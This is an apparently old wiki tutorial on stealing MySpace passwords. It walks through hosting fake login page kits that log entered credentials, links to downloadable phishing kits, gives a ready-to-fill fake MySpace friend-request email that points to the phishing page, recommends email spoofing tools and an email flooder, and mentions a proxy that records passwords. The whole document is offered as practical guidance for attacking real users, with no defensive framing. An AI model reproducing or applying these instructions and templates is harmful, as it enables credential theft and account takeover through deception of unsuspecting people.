
# Things to watch out for #

Myspace replaces any links you enter into their text fields with a redirect through msplinks.com. This is nothing new, but apparently after only taking them an entire year they figured out how to tell if the link goes off-site. Any off-site links will be met with this before redirecting.

# Methods #


## Fake login page kits ##

You can completely fake a login website, in that your page will look like a normal MySpace login page (except for the URL in the browser's address bar, but most people don't pay attention to that, which is why this method works), but will send the login and password entered to log file on your site!

### Kit 1 ###

The first step of MySpace phishing using this method, is to make a fake login page. What you need to do is sign up at a free hosting site that doesn't have ads and supports PHP. You can find a list of these at the [web hosts](/web_hosts) article.
After you sign up, you need to download all the files from here and upload to the host. Note that you MAY need to chmod the files to 0777!

### Kit 2 ###

Posted many moons ago in /i/, updated with newer way to get around MySpace security. This allows anybody with 15 minutes spare to set up and maintain their own MySpace phishing site.
Download: [Mediafire](http://anonym.to/http://www.mediafire.com/?sharekey=aa4708b368022712c79b87b207592a1ce04e75f6e8ebb871), [Rapidshare](http://anonym.to/http://rapidshare.com/files/52991443/myspace_2007-2.zip.html), [Megaupload](http://anonym.to/http://www.megaupload.com/?d=LPDZYFMO)
Mediafire + Megaupload links have been re-upped.

### Traditional Email Phishing ###

Tricking people into visiting fake logins. Set up a fake website, then link them to the site with the method below.

#### Making the email ####

Next, you need to send an email to people, getting them to click the link.
     Hi (your name),
     (someone) would like to be added to your MySpace friends list.
     By accepting (someone) as your friend, you will be able to send (someone) personal messages, (someone)'s photos and journals, and you will be able to interact with each other's friends and network!
     Click the following link to view (someone)'s profile and accept or reject this user as your friend: <a href='linkgoeshere'><http://www1.myspace.com/reloc.cfm?c=1&id=(8> random letters/numbers)-(4 random letters/numbers)-(4 random letters/numbers)-(4 random letters/numbers)-(12 random letters/numbers)</a>
     At MySpace we care about your privacy. We have sent you this notification to facilitate your use as a member of the MySpace.com service. If you don't want to receive emails like this to your external email account in the future, change your Account Settings to "Do not send me notification emails"
     Click here to change your Account Settings: <a href='linkgoeshere'><http://www.myspace.com/reloc.cfm?c=11></a>
     You can also contact us with any questions or concerns regarding your privacy at: <mailto:privacy@myspace.com>
     MySpace.com 1223 Wilshire Blvd. 402, Santa Monica, CA 90403-5400 USA
     2003-2006 MySpace.com. All Rights Reserved.
Fill in the areas in () and then take that and then replace the linkgoeshere with the path of login.html that you uploaded.
This needs to be send as html mail.
Now, the very last step is to spoof the from address. You can send it by signing up like somehotchick-myspace@yahoo.com, but it is not very convincing. The next section describes how to spoof mail.

### Spoofing from address ###

Try using something like [pySpoof](http://pythoncode.awardspace.com/). A tutorial on an alternate way to send mail can be found <s>[here](http://anonym.to/http://www.datastronghold.com/security-articles/general-security-articles/how-to-spoof-an-email-without-software.html) 404'd.
A quick email spoofer coded in php can be found here <s>[here](http://d0n7r33dd15.pcriot.com/EmailSpoofer.html) 404'd.
[PHP_Tutorial#Email_flooder_in_PHP](/PHP_Tutorial#Email_flooder_in_PHP)

### Proxy Tunnel Recording ###

This is a new method of getting myspace passwords, and works by having a completely functional web proxy, but having it record passwords. More information can be found in the [logProxy](/logProxy) article.
{{Tutorials}}

